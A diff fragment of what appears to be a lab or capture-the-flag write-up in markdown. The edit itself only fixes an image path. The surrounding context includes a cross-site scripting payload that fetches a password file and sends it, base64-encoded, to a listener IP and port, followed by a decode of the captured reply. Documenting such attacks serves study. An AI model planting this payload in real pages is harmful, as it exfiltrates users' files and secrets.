@@ -83,7 +83,7 @@ fetch('/dir/pass.txt')
 <script>fetch('/dir/pass.txt').then(r=>r.text()).then(t=>fetch('http://192.168.130.250:4444/?data='+btoa(t)))</script>
 ```
 
-![xss_fetch_test1.PNG](xss_fetch_test1.PNG)
+![xss_fetch_test1.PNG](./img/xss_fetch_test1.PNG)
 
 ```bash
 └─$ echo 'PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9JRVRGLy9EVEQgSFRNTCAyLjAvL0VOIj4KPGh0bWw+PGhlYWQ+Cjx0aXRsZT40MDMgRm9yYmlkZGVuPC90aXRsZT4KPC9oZWFkPjxib2R5Pgo8aDE+Rm9yYmlkZGVuPC9oMT4KPHA+WW91IGRvbid0IGhhdmUgcGVybWlzc2lvbiB0byBhY2Nlc3MgdGhpcyByZXNvdXJjZS48L3A+Cjxocj4KPGFkZHJlc3M+QXBhY2hlLzIuNC40MSAoVWJ1bnR1KSBTZXJ2ZXIgYXQgMTAuMTEzLjE0My4xOTEgUG9ydCA4MDwvYWRkcmVzcz4KPC9ib2R5PjwvaHRtbD4K' | base64 -d
